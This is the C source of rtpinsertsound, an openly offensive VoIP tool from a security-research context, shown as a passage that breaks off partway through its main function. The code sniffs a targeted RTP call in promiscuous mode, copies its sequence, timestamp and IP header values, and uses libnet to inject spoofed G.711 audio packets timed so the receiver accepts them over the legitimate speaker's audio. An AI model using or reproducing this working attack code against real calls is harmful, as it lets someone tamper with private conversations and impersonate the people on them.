//-------------------------------------------------------------------------------
//
// rtpinsertsound.c - Command line tool to insert the content
//               of a sound file into a call. This tool presumes that
//               the host from which the tool is executed is not
//               MITM in the audio stream. However, it presumes
//               the host from which the tool is executed is capable
//               of sniffing the specified stream (e.g. the host is
//               connected to a hub through which the audio stream
//               is flowing).
//
//               Note: this behavior is in contrast to the tool,
//                          rtpreplacesound, which presumes the host
//                          from which the tool is executed is MITM.
//                          As such, the audio is received and dropped
//                          in favor of the audio replacing it.
//
//               This tool sniffs a specified audio stream for RTP
//               packets. It uses the protocol header parameters it
//               captures to spoof the sender (e.g. sequence number).
//               The goal is to transmit audio packets in advance
//               of the sender that is being spoofed by the tool in
//               hopes of persuading the receiver to accept the audio
//               from this tool and disregard audio packets from
//               the legitimate sender as redundant.
//
//               The format of the pre-recorded audio must
//               be one of the following:
//
//               a) a file name with the .wav extension is a 
//                    standard Microsoft RIFF multimedia
//                    formatted WAVE file.
//
//               b)  a file name without the .wav extension is
//                     a sequence of, exclusively, G.711 u-law
//                     RTP/UDP/IP/ETHERNET messages.
//
//               The RTP header timestamp and sequence
//               number in the spoofed packet are adjusted
//               by a factor. The IP header ID in the spoofed
//               packet is also adjusted by a factor. 
//
//               The goal is to transmit audio packets
//               containing protocol header values to persuade
//               the targeted destination device that the spoofed
//               packets are more timely and that the audio
//               packets the destination continues to receive
//               from the legitimate transmitter are too
//               early or late.
//
//               Note: this tool is unidirectional, but you can run
//                          two instances to affect each side of a 2-party
//                          call.
//
//    Copyright (C) 2006  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//    Authors:
//        v3.0 : 01/03/2007
//            Mark D. Collier <mark.collier@securelogix.com>, SecureLogix
//            Mark O'Brien, SecureLogix
//            Dustin D. Trammell <dtrammell@tippingpoint.com>, TippingPoint
//        v2.0 : 10/10/2006
//        v1.0 : 08/14/2006
//            Mark D. Collier <mark.collier@securelogix.com>, SecureLogix
//            Mark O'Brien, SecureLogix
//
//        SecureLogix: http://www.securelogix.com
//        TippingPoint: http://www.tippingpoint.com
//        Hacking Exposed VoIP: http://www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include <libfindrtp.h>
#include "hack_library.h"
#include "g711conversions.h"
#include "rtpinsertsound.h"

int  main ( int argc, char *argv[] ) {

//
//      Some declarations and initializations
//
    int i;
    int bytesWritten;
    int ipPacketSize;
   
    rtp_pair *rp                = NULL;
    int rtpSrcPort              = 0;
    int rtpDestPort             = 0;
    int spoofFactor             = 2;    // default
    int jitterFactor            = 80;   // default (i.e. ouput spoofed RTP packet ASAP)
    
    unsigned int   pause                        = 0;
    unsigned int   idxExtension                 = 0;
    unsigned int   numG711PacketEquivalents     = 0;
    unsigned int   rtpSrcIPv4Addr               = 0;
    unsigned int   rtpDestIPv4Addr              = 0;
    
    unsigned int   spoofTimestamp;
    unsigned int   spoofSSRC;
    unsigned short spoofID;
    unsigned short spoofSeqNumber;
    
    char macString[18] = "";   //  6 hex bytes * 2 char/byte + 5 colons  + end-of-string

    bool bSuccess                = false;
    bool bFoundSyncPacket        = false;
            
    struct rtp_msg rtp_msg_to_insert;
        
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    char rtpDestIPv4AddrDotted[16];
    char rtpSrcIPv4AddrDotted [16];
    
    char *psDevice              = "eth0";
    char *psRtpSrcIPv4Addr      = NULL;
    char *psRtpDestIPv4Addr     = NULL;
    char *psTempIPv4Addr        = NULL;
    char *psInputAudioFile      = NULL;
    
    float expectedAudioPlaybackTime = 0;

    signal ( SIGTERM, catch_signals );
    signal ( SIGINT, catch_signals  );    

//
//      Check the number of command line parms entered.
//
    if ( argc < 2 ) {
        printf( "\nError: 1 command line parameter is mandatory\n" );
        usage ( EXIT_FAILURE );
    };

//
//  Parse the command line.
//

    while ( ( opt = getopt ( argc, argv, "a:A:b:B:f:i:j:p:vh?" ) ) != EOF ) {
        switch ( opt ) {
            case 'a':
                //  Source RTP IP address. Str2IP returns the numeric IP address
                //  in network byte order.

                psRtpSrcIPv4Addr = optarg;
                psTempIPv4Addr = strdup( psRtpSrcIPv4Addr );

                if ( Str2IP ( psTempIPv4Addr, &rtpSrcIPv4Addr ) != EXIT_SUCCESS ) {
                    printf ( "\nsource IPv4 addr invalid: %s\n", psRtpSrcIPv4Addr );
                    free ( psTempIPv4Addr );
                    usage ( EXIT_FAILURE );                 // control does not return here
                }

                snprintf ( rtpSrcIPv4AddrDotted, 15, psRtpSrcIPv4Addr );

                free ( psTempIPv4Addr );
                psTempIPv4Addr = NULL;
                break;
            case 'A':
                //  Source RTP port number.

                rtpSrcPort = atoi ( optarg );
                if ( rtpSrcPort  < 0 || rtpSrcPort  > 65535 ) {
                    printf ( "\nRTP Source Port range = 0 to 65535\n" );
                    usage ( EXIT_FAILURE );                 // control does not return here
                }
                break;
            case 'b':
                //  Destination RTP IP address. Str2IP returns the numeric IP address
                //  in network byte order.

                psRtpDestIPv4Addr = optarg;
                psTempIPv4Addr = strdup( psRtpDestIPv4Addr );

                if ( Str2IP ( psTempIPv4Addr, &rtpDestIPv4Addr ) != EXIT_SUCCESS ) {
                    printf ( "\nsource IPv4 addr invalid: %s\n", psRtpDestIPv4Addr );
                    free ( psTempIPv4Addr );
                    usage ( EXIT_FAILURE );                 // control does not return here
                }

                snprintf ( rtpDestIPv4AddrDotted, 15, psRtpDestIPv4Addr );

                free ( psTempIPv4Addr );
                psTempIPv4Addr = NULL;
                break;
            case 'B':
                //  Destination RTP port number.

                rtpDestPort = atoi ( optarg );
                if ( rtpDestPort  < 0 || rtpDestPort  > 65535 ) {
                    printf ( "\nRTP Destination Port range = 0 to 65535\n" );
                    usage ( EXIT_FAILURE );                 // control does not return here
                }
                break;
            case 'f':
                spoofFactor = atoi ( optarg );  // increment and mutiplication factor
                break;
            case 'i':
                //  Ethernet device.
                psDevice = optarg;
                break;
            case 'j':
                jitterFactor = atoi ( optarg ); // spoofed pkt jitter factor %
                break;
            case 'p':
                pause = atoi ( optarg );        // pause value (in seconds)
                break;
            case 'v':
                bVerbose = true;                // Verbose option.
                break;
            case 'h':
            case '?':
                usage( EXIT_SUCCESS );          // control does not return here.
                break;
        }
    }

//
//  getopt permutes the order of the parms in argv[] placing non-optional parms
//  at the end of argv. optind should be the index of the 1st mandatory non-optional
//  parm in argv[] and there must be exactly 5 non-optional mandatory parms:
//

    if ( optind != ( argc - 1 ) ) {
        printf( "\nError: 1 command line parameter is mandatory\n" );
        usage ( EXIT_FAILURE );                 // control does not return here
    }

//
//  Pathname of the file containing audio to insert into the live audio stream
//  described by the other command line arguments.
//
    psInputAudioFile = argv[optind++];
    
//
//  spoof factor
//
    if ( spoofFactor  < -1000 || spoofFactor  > 1000 ) {
        printf ( "\noptional spoof factor range: +/- 1000\n" );
        usage ( EXIT_FAILURE );                 // control does not return here
    }
    
//
//  jitter factor (i.e. see usage ( ) )
//
    
    if ( jitterFactor  < 0 || jitterFactor  > 80 ) {
        printf ( "\noptional jitter factor range: 0 to 80\n" );
        usage ( EXIT_FAILURE );                 // control does not return here
    }
    
//
//  FIXME: For now, the tool only supports the G.711 codec.    
//

    if ( jitterFactor < 80 ) {
        jitterDelayUsec = ( unsigned int ) (
            ( ( float ) __RTPINSERTSOUND_G711_CODEC_INTERVAL_USEC ) -
            ( ( ( float ) __RTPINSERTSOUND_G711_CODEC_INTERVAL_USEC ) *
            ( ( ( float ) jitterFactor ) / 100.0 ) ) );
        jitterProximityUsec =
            __RTPINSERTSOUND_G711_CODEC_INTERVAL_USEC - jitterDelayUsec;
    } // end if ( jitterFactor < 80 )       

//
//  Fill out any missing RTP Session data
//
    extern unsigned int libfindrtp_debug;
    libfindrtp_debug = bVerbose;

    if ( !psRtpSrcIPv4Addr || !rtpSrcPort ||
         !psRtpDestIPv4Addr || !rtpDestPort ) {
        rp = libfindrtp_find_rtp( psDevice, 1, psRtpSrcIPv4Addr, psRtpDestIPv4Addr );
        if ( rp ) {
            rtpSrcIPv4Addr = rp->ip_a_n;
            psRtpSrcIPv4Addr = (char *)&rp->ip_a_a;
            memcpy( rtpSrcIPv4AddrDotted, &rp->ip_a_a, 16);
            rtpSrcPort = rp->port_a;

            rtpDestIPv4Addr = rp->ip_b_n;
            psRtpDestIPv4Addr = (char *)&rp->ip_b_a;
            memcpy( rtpDestIPv4AddrDotted, &rp->ip_b_a, 16);
            rtpDestPort = rp->port_b;
        }
    }

//
//  Print summary of parms.
//

    printf ( "\n%s\n", __RTPINSERTSOUND_VERSION );
    printf ( "%s\n",   __RTPINSERTSOUND_DATE    );

    printf ( "\nsource IPv4 addr:port = %s:%u",
             rtpSrcIPv4AddrDotted,  rtpSrcPort  );

    printf ( "\ndest   IPv4 addr:port = %s:%u",
             rtpDestIPv4AddrDotted, rtpDestPort );

    printf ( "\nInput audio file: %s\n", psInputAudioFile );
    
    printf ( "\nspoof factor: %d", spoofFactor );
    
    if ( jitterFactor == 80 ) {
        printf ( "\njitter factor: output spoofed packets ASAP\n" );
    } else {
        printf ( "\njitter factor: %d%% "
                 " = wait %u usec to output each spoofed RTP packet\n",
                 jitterFactor, jitterDelayUsec );
/*            
        printf ( "\nmax SCHED_FIFO scheduling priority      = %d\n"
                 "\nmax SCHED_RR scheduling priority        = %d\n"
                 "\nmax SCHED_OTHER scheduling priority     = %d\n"
                 "\nmin SCHED_FIFO scheduling priority      = %d\n"
                 "\nmin SCHED_RR scheduling priority        = %d\n"
                 "\nmin SCHED_OTHER scheduling priority     = %d\n",
                 sched_get_priority_max( SCHED_FIFO ),
                 sched_get_priority_max( SCHED_RR ),
                 sched_get_priority_max( SCHED_OTHER ),
                 sched_get_priority_min( SCHED_FIFO ),
                 sched_get_priority_min( SCHED_RR ),
                 sched_get_priority_min( SCHED_OTHER ) );
*/

//
//  The user has specified a jitter factor other than the default of 80 (i.e. ASAP).
//  Raise the execution priority of rtpinsertsound to the maximum priority
//  in order to attempt to output each spoofed audio packet as close as possible to
//  the time delta desired by the user before the next legitimate audio packet
//  is expected.
//
        
        int process_priority = 0;
        
        process_priority = getpriority( PRIO_PROCESS, 0 /* this process */ );
       
        printf ( "\n\nProcess priority was = %d\n", process_priority );
        
        process_priority = -20;   // -20 to 19: max (i.e. best) priority = -20, normal = 0
        
        rc = setpriority ( PRIO_PROCESS, 0 /* this process */, process_priority );
        
        if ( rc == 0 ) {
           printf ( "\nProcess Priority set to: %d (i.e. highest priority)\n",
                    getpriority( PRIO_PROCESS, 0 /* this process */ ) );
        } else {
           printf ( "\nError: Could not set process priority to: %d\n",
                     process_priority );
            CleanupAndExit ( EXIT_FAILURE );        // control does not return here
        }
    } // end if ( jitterFactor == 80 )

    if ( bVerbose ) {
        printf ( "\nVerbose mode" );
    }
    
//
//  Vet the specified pre-recorded audio file to confirm it complies
//   with various restrictions imposed by this tool.
//
    
    idxExtension = strlen ( psInputAudioFile ) - 4;
    
    if ( idxExtension > 0 ) {
        // filename could have .wav extension
        if ( psInputAudioFile[ idxExtension     ] == '.' &&
             psInputAudioFile[ idxExtension + 1 ] == 'w' &&
             psInputAudioFile[ idxExtension + 2 ] == 'a' &&
             psInputAudioFile[ idxExtension + 3 ] == 'v'    ) {
            bSuccess = preloadWavAudio ( psInputAudioFile,
                                         pcmuSamplesToInsert, 
                                         &numG711PacketEquivalents );
        } else {
            bSuccess = preloadTCPdumpAudio ( psInputAudioFile,
                                             pcmuSamplesToInsert, 
                                             &numG711PacketEquivalents );
        }
    } else {
        bSuccess = preloadTCPdumpAudio ( psInputAudioFile,
                                         pcmuSamplesToInsert, 
                                         &numG711PacketEquivalents );
    }
    
    if ( !bSuccess ) {
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( numG711PacketEquivalents == 0 ) {
        printf ( "\nError: Audio input file is empty or doesn't hold"
                 "\nat least one G.711 packet's worth of audio.\n" );
        CleanupAndExit ( EXIT_FAILURE );    //  control does not return here
    }
    
    printf ( "\nAudio read from input file equates to %u G711 packets.\n",
             numG711PacketEquivalents );

    expectedAudioPlaybackTime = (float) numG711PacketEquivalents /
                                (float) __RTPINSERTSOUND_G711_CODEC_RATE_HZ;
    
    printf ( "At an ideal playback rate of %u Hz, this represents\n"
             "%4.2f seconds of audio.\n",
             __RTPINSERTSOUND_G711_CODEC_RATE_HZ,
             expectedAudioPlaybackTime );
        
//
//  It's time to sniff the specified network interface and try to capture
//  a packet from the audio stream specified by command line arguments    
//
    
    pcap_errbuf[ 0 ] = '\0';

    h_pcap_live_rtp =
        pcap_open_live (
            psDevice,                           // interface to open
            65535,                              // max. # of bytes to capture
            __RTPINSERTSOUND_PROMISCOUS_MODE,   // open in promiscous mode
            0,                                  // wait forever for 1 packet.
            pcap_errbuf );                      //  where an error string is stored
    
    if ( h_pcap_live_rtp == NULL ) {
        fprintf ( stderr,
                  "\nCouldn't open interface to sniff/insert audio %s: %s\n",
                  psDevice, pcap_errbuf );
        CleanupAndExit ( EXIT_FAILURE );
    }
    
    if ( pcap_errbuf[ 0 ] != '\0' ) {
        //  pcap has returned a warning instead of an error
        fprintf ( stderr,
                  "\npcap warning: %s\n", pcap_errbuf );
    }

//
//  Prompt user for injection command or pause number of seconds specified on
//  the command-line.
//

    if ( pause ) {
        printf( "\nWaiting %d seconds...\n", pause );
        sleep( pause );
    }
    else {
        printf( "\nReady to inject, press <ENTER> to begin injection...\n" );
        scanf( "%*c" );
    }
 
//
//  Need to open a socket purely for the purpose of obtaining the MAC address of
//  the specified device. The MAC address of the device must be included in the
//  pcap filter to prevent the spoofed packets output from this tool from being
//  captured by pcap and feed back into the tool as if they came from the 
//  RTP transmitter this tool has been commanded to spoof. 
//

    strcpy ( ifreq.ifr_ifrn.ifrn_name, psDevice );

    if ( ( sockfd = socket ( AF_INET, SOCK_DGRAM, IPPROTO_UDP ) ) < 0 ) {
        fprintf ( stderr,
                  "\nsocket - Couldn't allocate socket to obtain device MAC addr\n" );
        CleanupAndExit ( EXIT_FAILURE );  //  control does not return here
    }

    if ( ioctl ( sockfd, SIOCGIFHWADDR, &ifreq ) != 0 ) {
        fprintf ( stderr,
                  "\nioctl - Couldn't read socket's MAC address\n" );
        CleanupAndExit ( EXIT_FAILURE );  //  control does not return here
    }

    memcpy ( deviceMAC, ifreq.ifr_hwaddr.sa_data, IFHWADDRLEN );
    
    macString[0] = '\0';    //  initialize workspace string to NUL string
    
    sprintf ( macString, "%02x:%02x:%02x:%02x:%02x:%02x", 
              deviceMAC[0],
              deviceMAC[1],
              deviceMAC[2],
              deviceMAC[3],
              deviceMAC[4],
              deviceMAC[5],
              deviceMAC[6] );
    
    if ( bVerbose ) {
        printf ( "\n%s's MAC: %s\n", psDevice, macString ); 
    }        

//
//  Create a libpcap filter to restrict the capture to the audio stream
//  specified by command line arguments
//
//  The filter is a string of this form:
//     "src host <ip dotted addr> and dst host <dotted IP addr> and udp src port <port>
//       and udp dst port <port> and not ether src <MAC of spoof packet output interface>"
//
    
    char pcap_filter[ 300 ];  //  Provide more than enough space for the filter ( i.e.  2x)
    
    pcap_filter[0] = '\0';    //  NUL string
    
    rc = snprintf ( pcap_filter, sizeof( pcap_filter ),
                    "src host %s and dst host %s and "
                    "udp src port %u and udp dst port %u and "
                    "not ether src %s",
                    psRtpSrcIPv4Addr,
                    psRtpDestIPv4Addr,
                    rtpSrcPort,
                    rtpDestPort,
                    macString );

    if ( rc >= sizeof ( pcap_filter ) ) {
        printf ( "\nError: pcap filter string was limited at %u characters. "
                 "Expected room to spare.\n", sizeof ( pcap_filter ) - 1 );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
    if ( rc < 0 ) {
        printf ( "\nError: pcap filter string problem. Size of string = %u\n",
                 sizeof ( pcap_filter ) - 1 );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
    rc = pcap_compile ( h_pcap_live_rtp,
                        &compiled_pcap_filter,
                        pcap_filter,
                        0,                      // don't optimize filter
                        0xFFFFFF00 );           // netmask (i.e. 255.255.255.0)

    if ( rc < 0 ) {
        pcap_perror ( h_pcap_live_rtp, "\nError: pcap_compile filter : " );
        printf ( "\n" );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
    rc = pcap_setfilter ( h_pcap_live_rtp, &compiled_pcap_filter );
    
    if ( rc < 0 ) {
        pcap_perror ( h_pcap_live_rtp, "\nError: pcap_setfilter : " );
        printf ( "\n" );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
//
//   program pointed by the bpf_program may be freed after the program 
//   has been installed by a call to pcap_setfilter
//
    
    pcap_freecode( &compiled_pcap_filter );
    
    if ( bVerbose ) {
        printf ( "\npcap filter installed for live audio stream "
                 "sniffing: %s\n", pcap_filter );
    }

//
//  The pcap manual states that pcap_next( ) is alwasys blocking. Perhaps
//  this statement can be extrapolated to use of pcap_next_ex( ) as well.
//  Just to be safe, explicitly set the pcap descriptor to blocking.
//
    
    pcap_setnonblock( h_pcap_live_rtp,
                      0,                   // 0 = blocking
                      pcap_errbuf );
    
    rc = pcap_getnonblock( h_pcap_live_rtp, pcap_errbuf );

    if ( bVerbose ) {
        if ( rc == 0 ) {
            printf ( "\npcap live %s interface is blocking\n\n", psDevice );
        } else {
            if ( rc == -1 ) {
                printf ( "\npcap getnonblock( ) error: %s\n\n", pcap_errbuf );
            } else {
                printf ( "\npcap live %s interface is non-blocking\n\n",
                         psDevice );
            }
        }
    }
        
//
//  Set the direction that pcap will capture packets. This tool spoofs the transmitter
//  of an audio stream that pcap's filter is now programmed to detect. We don't want
//  pcap to mistake the tool's outgoing packet's for those we are interested in 
//  receiving. So, restrict the pcap capture to incoming packets only.
//

/*  Setting the direction did not appear to work when spoofing packets.
     Instead, we had to set the pcap filter to exclude packets with the MAC
     address of the ethernet interface this host is using to receive legitimate
     packets and transmit spoofed packets
    
    rc = pcap_setdirection ( h_pcap_live_rtp, PCAP_D_IN );

    if ( rc == -1 ) {
        pcap_perror ( h_pcap_live_rtp,
                      "\nError: could not set pcap capture direction : " );
        printf ( "\n" );
        CleanupAndExit ( EXIT_FAILURE );  // control does not return here
    }
*/

    printf ( "\nAttempting to sniff RTP packets from "
             "the specified audio stream......" );
    fflush ( stdout );   
    
    rc = pcap_next_ex ( h_pcap_live_rtp, &ppcap_pkthdr, &packet );

    if ( rc == -1 ) {
        pcap_perror ( h_pcap_live_rtp,
                      "\nError: while attempting to sniff live audio : " );
        printf ( "\n" );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
    if ( rc == 0 ) {
        printf ( "\nTimeout reported by pcap_next_ex( ), but "
                 "no timeout was requested.\n" );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }
    
    printf ( "\nSuccessfully detected a packet from targeted audio stream:\n" );
    
    if ( bVerbose ) {
        decodeAndPrintRTPMsg ( packet );
    }
    
//
//  Prime the rtp_msg_to_insert structure with the
//  rtp header of the captured packet
//
    
    memcpy ( &(rtp_msg_to_insert.rtp_hdr),
             packet + offset_to_rtp_msg,
             sizeof ( struct rfc1889_rtp_hdr ) );
    
//
//  Confirm that the target audio stream is G.711.
//
//  FIXME: The tool only supports G.711 ulaw.
//

    rtp_hdr = ( struct rfc1889_rtp_hdr * ) ( packet + offset_to_rtp_msg );
    
    if ( rtp_hdr->payloadType !=
         __RTPINSERTSOUND_G711_PAYLOAD_TYPE ) {
        printf ( "\nThe target audio stream is not bearing G.711"
                 "\nu-law encoded audio. Payload type = %u\n",
                 rtp_hdr->payloadType );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
    }

    
//
//  Initialize the libnet library in preparation for spoofing. Root privileges are required.
//  
//  Note: it has been demonstrated that the order in which ethernet interfaces appear
//            in your route table might override your attempt to output spoofed packets
//            over a certain ethernet interface. For example, the device specified in the 
//            call to libnet_init() below might prove irrelevant.
//
//            For example, suppose the user executing this tool specified eth2 on the
//            command line. However, suppose eth0 is also up, eth0 was brought into
//            service earlier than eth2, and eth0 also provides a route to the targeted
//            destination device. In that case, eth0 will appear in the route table before
//            eth2. The spoofed packets are transmitted out eth0 instead of eth2!!!!
//            The problem in this example can be solved in one of the following ways:
//
//                1) specify eth0 instead of eth2 on the command line
//                2) Take eth0 down. Its entry is automatically removed from the route table
//                3) Take eth0 down and then bring it up. This changes the order
//                     of the interfaces in the route table
//
//            Who cares which interface is used if the packets make it to the intended
//             destination in a timely fashion? We do. The reason is that the pcap filter
//            (i.e. see above) had to exclude receiving packets from the MAC of the
//            interface stipulated by the user on the command line. The filter prevents
//            the tool from recapturing spoof packets it generates (i.e. spoofing itself).
//            If the spoofed packets exit this host on a different interface then the
//            one specified on the command line, they might be transmitted back to
//            this host through the interface specified on the command line
//            (e.g. if, for example, both interfaces are connected to a hub). Since the
//            source MAC on the packets will be the interface through which the 
//            spoofed packets were unintentionally transmitted, the pcap filter
//            will not exclude them from being captured. The ramification of this
//            will be that the tool will feed on its own output and the pre-recorded
//            audio file will be exhaused in a fraction of a second.
//

printf ("\n __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER = %u \n", 
         __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER );

#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_IP

    l = libnet_init (
            LIBNET_RAW4,        // injection type
            psDevice,           // network interface (i.e. see note above)
            libnet_errbuf );    // errbuf
            
    printf ( "\nWill inject spoofed audio at IP layer\n" );

#elif __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET
    
    l = libnet_init(
            LIBNET_LINK,        // injection type
            psDevice,           // network interface
            libnet_errbuf );    // errbuf 
    
    printf ( "\nWill inject spoofed audio at Ethernet layer\n" );

#else
    
    printf ( "\nInvalid Compiler PreProcessor value was assigned to: \n"
             "\n__RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER. Check rtpinsertsound.h\n" );
    CleanupAndExit ( EXIT_FAILURE );
    
#endif

    if ( l == NULL ) {
        fprintf ( stderr, "libnet_init() failed: %s\n", libnet_errbuf );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return
    }

//
//  Build the libnet UDP packet. This one doesn't really count, but it's used
//  to prime the audio insertion loop to follow shortly. That loop is where each
//  memory-resident RTP message will have its RTP header values set
//  properly to spoof the legitimate audio stream. The thought here is that
//  libnet probably takes longer to execute the first time it creates a ptag
//  UDP header as opposed to when it simply updates one.
//

    udp_tag = libnet_build_udp (
		rtpSrcPort,                       // source port
		rtpDestPort,                      // destination port
		LIBNET_UDP_H + g711_rtp_msg_len,  // total UDP packet length
		0,                                // let libnet compute checksum
                (u_int8_t *) &rtp_msg_to_insert,  // payload
                g711_rtp_msg_len,                 // payload length
		l,                                // libnet handle
		udp_tag );                        // ptag - 0 = build new, !0 = reuse

    if ( udp_tag == -1 ) {
        printf ( "Can't build  UDP packet: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );   //  control does not return
    }

//
//  Build the libnet IP header. This one doesn't really count, but it's used
//  to prime the audio insertion loop to follow shortly. That loop is where 
//  header values in the spoofed packet are manipulated relative to the 
//  packet received triggering the spoofed packet output. The thought here
//  is that libnet probably takes longer to execute the first time it creates a
//  ptag IP header as opposed to when it simply updates one.
//

    ipPacketSize = LIBNET_IPV4_H + LIBNET_UDP_H + g711_rtp_msg_len;
    
    ip_hdr = ( struct libnet_ipv4_hdr * ) ( packet + offset_to_ip_hdr );

    ip_tag = libnet_build_ipv4 (
            ipPacketSize,               // size
            ip_hdr->ip_tos,             // ip tos
            ntohs ( ip_hdr->ip_id ),    // ip id
            ntohs ( ip_hdr->ip_off ),   // fragmentation bits
            ip_hdr->ip_ttl,             // ttl
            IPPROTO_UDP,                // protocol
            0,                          // let libnet compute checksum
            rtpSrcIPv4Addr,             // source address
            rtpDestIPv4Addr,            // destination address
            NULL,                       // payload
            0,                          // payload length
            l,                          // libnet context
            ip_tag );                   // ptag - 0 = build new, !0 = reuse
			
    if ( ip_tag == -1 ) {
        printf ( "Can't build IP header: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }
    
#if __RTPINSERTSOUND_LIBNET_PROTOCOL_LAYER == __RTPINSERTSOUND_LIBNET_ETHERNET
    
//
//  Build the libnet Ethernet header. This one doesn't really count, but it's used
//  to prime the audio insertion loop to follow shortly. The Ethernet header
//  is expected to be constant for all spoofed packets in a given stream. However,
//  the FCS (i.e. Frame Check Sequence) appearing at the end of the Ethernet
//  packet will change with each packet since the content of the Ethernet
//  payload changes with each packet. The thought here is that libnet probably
//  takes longer to execute the first time it creates a ptag Ethernet header as
//  opposed to when it simply updates one.
//
    
    eth_hdr = ( struct libnet_ethernet_hdr * ) packet;
    
    ether_tag = libnet_build_ethernet (
            (u_int8_t *) &(eth_hdr->ether_dhost), // dest mac
            (u_int8_t *) &(eth_hdr->ether_shost), // source mac
            ETHERTYPE_IP,                         // type upper layer protocol
            NULL,                                 // payload
            0,                                    // payload size
            l,                                    // libnet handle
            ether_tag );                          // ptag - 0 = build new, !0 = reuse
    
    if ( ether_tag == -1 ) {
        printf( "Can't build standard ethernet header: %s\n",
                libnet_geterror( l ) );        
        CleanupAndExit( EXIT_FAILURE );
    }
    
#endif

    printf ( "\nWill now synchronize the interlacing of the pre-recorded"
             "\naudio to the next audio packet captured from the target"
             "\naudio stream."
             "\n"
             "\nThere will be no further printed output until pre-recorded"
             "\naudio playback has completed. Since the audio to insert is"
             "\n%4.2f sec in length, the tool has failed if much greater"
             "\nthan %4.2f seconds elapse without a completion confirmation."
             "\nIn all likelihood, failure to begin inserting audio, or failure"
             "\nto complete the insertion once it has begun, means the target"
             "\naudio stream is no longer available to drive the mixing"
             "\nloop (e.g. the targeted call has ended or changed state)."
             "\nIt's also possible you're attempting to run the tool on a"
             "\nvery slow or very heavily loaded machine.\n",
             expectedAudioPlaybackTime, expectedAudioPlaybackTime );
    fflush ( stdout );

//
//  Sync to the targeted audio stream for real-time playback of pre-recorded audio.   
//  First make sure the incoming buffer of pcap messages has been drained.
//  Unfortunately, there is no mechanism to explicitly inquire whether the
//  pcap buffer is empty or how many packets are waiting to be retrieved. 
//  There are a couple of approaches to solving this problem. The chosen
//  approach is to retrieve a packet and compare the time the packet
//  arrived with the current time-of-day. When the current time-of-day
//  is less than 1 ms later than the time-of-day recoded when the packet
//  was received, we declare that packet to be the sync packet.
//

    bFoundSyncPacket = false;
    
    i = 0;

    do {    
        rc = pcap_next_ex ( h_pcap_live_rtp, &ppcap_pkthdr, &packet );
    
        if ( rc == -1 ) {
            pcap_perror ( h_pcap_live_rtp,
                          "\nError: while attempting to sniff live audio : " );
            printf ( "\n" );
            CleanupAndExit ( EXIT_FAILURE );   //  control does not return here
        }
        
        if ( rc == 0 ) {
            printf ( "\nTimeout reported by pcap_next_ex( ), but"
                     "no timeout was requested.\n" ); 
            CleanupAndExit ( EXIT_FAILURE );   //  control does not return
        }
        
        gettimeofday( &time_of_day, NULL );  // retrieve current TimeOfDay
        
        //  Compute TimeOfDay (sec resolution)  - TimeOfArrival (sec resolution)
        
        deltaTSec = time_of_day.tv_sec - ppcap_pkthdr->ts.tv_sec;
        
        if ( deltaTSec == 0 ) {
            
            //  Times to compare are within same second  
            
            deltaTUsec =
                time_of_day.tv_usec - ppcap_pkthdr->ts.tv_usec;
            
            if ( deltaTUsec < 1000 ) {
                //  deltaT is within 1 ms
                bFoundSyncPacket = true;
            }
            
        } else {
            
            //  The TOD has incremented into - at least - the next  second
            //  compared to the TOA pcap recorded for the packet under
            //  evaluation. While it's unlikely the TOD is more than
            // 1 second later than the TOA, we need to check to be certain
            
            if ( deltaTSec == 1 ) {
                
                //  Worst case, this could be a delta of barely under 2 seconds.
                
                deltaTUsec =
                    ( 1000000 + time_of_day.tv_usec ) -
                    ppcap_pkthdr->ts.tv_usec;
                
                if ( deltaTUsec < 1000 ) {
                    //  deltaT is within 1 ms
                    bFoundSyncPacket = true;
                }
            }
        }
        
        i++;
        if ( i == 1000 && !bFoundSyncPacket ) {
            printf ( "\nError: Evaluated 1000 packets from the udp "
                     "stream specified by the command line arguments. "
                     "None passed the stream sync criteria of being "
                     "evaluated within 1 ms of its arrival by pcap. "
                     "Either 1 ms is too tight a tolerance, the tool "
                     "is running on an extermely slow or heavily loaded "
                     "machine, or perhaps the stream you've targeted "
                     "is already under attack by a udp flood tool. "
                     "Since the audio stream should be no faster than "
                     "%u Hz, we're only expecting an audio packet about "
                     "once or twice every %u ms.\n\n",
                     __RTPINSERTSOUND_G711_CODEC_RATE_HZ,
                     __RTPINSERTSOUND_G711_CODEC_INTERVAL_USEC );
            
            CleanupAndExit ( EXIT_FAILURE );  //  control does not return here
        }                     
    } while ( !bFoundSyncPacket );

//    printf ( "\n# loops required to sync = %u\nDeltaTUsec = %d\n", i, deltaTUsec );
    
//
//  The output of each spoofed packet is triggered by the reception of an
//  audio packet from the transmitter being spoofed. Spoofed packets have
//  RTP header sequence number and timestamp values adjusted by a factor 
//  relative to the header values captured in the legitimate RTP packet provoking
//  the output of a corresponding spoof packet. If the goal is to convince the 
//  destination endpoint to accept spoof packets and reject legitimate
//  packets, then a small positive factor should be adequate (e.g. 1 to 5).
